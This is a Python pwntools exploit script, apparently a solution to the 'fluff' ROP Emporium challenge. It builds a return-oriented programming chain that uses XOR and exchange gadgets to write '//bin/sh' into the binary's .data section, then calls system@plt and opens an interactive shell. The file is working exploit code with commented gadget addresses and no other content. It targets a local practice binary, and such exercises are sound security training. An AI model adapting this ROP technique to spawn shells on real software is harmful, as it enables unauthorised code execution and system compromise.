#!/usr/bin/env python

from pwn import *

p = process("./fluff")
p.recv(1024)

payload = (
    "\x90" * 40 +
    p64(0x400832) + # pop r12
    p64(0x601216) + # .data (0x601050) ^ 0x246 (r11) = 0x601216
    p64(0x40082f) + # xor r11, r12 ; pop r12 ; mov r13d,0x604060 ret
    p64(0x0) + # trash pop r12
    p64(0x400840) + # xchg r11, r10 ; pop r15 ; mov r11d,0x602050; ret
    p64(0x0) + # trash pop r15

    p64(0x400832) + # pop r12
    p64(0x68732f6e69020f7f) + # 0x68732f6e69622f2f (//bin/sh) ^ 0x602050 (r11) 0x68732f6e69020f7f
    p64(0x40082f) + # xor r11, r12 ; pop r12 ; mov r13d,0x604060 ret
    p64(0x0) + # trash pop r12

    p64(0x40084e) + # mov QWORD PTR [r10],r11 ; pop r13 ; pop r12 ; xor BYTE PTR [r10],r12b ; ret
    p64(0x0) + # trash pop r13
    p64(0x0) + # trash pop r12

    p64(0x4008c3) + #  pop rdi ; ret
    p64(0x601050) + # /bin/sh
    p64(0x4005e0) # system@plt
)

p.sendline(payload)
p.interactive()

p.close()
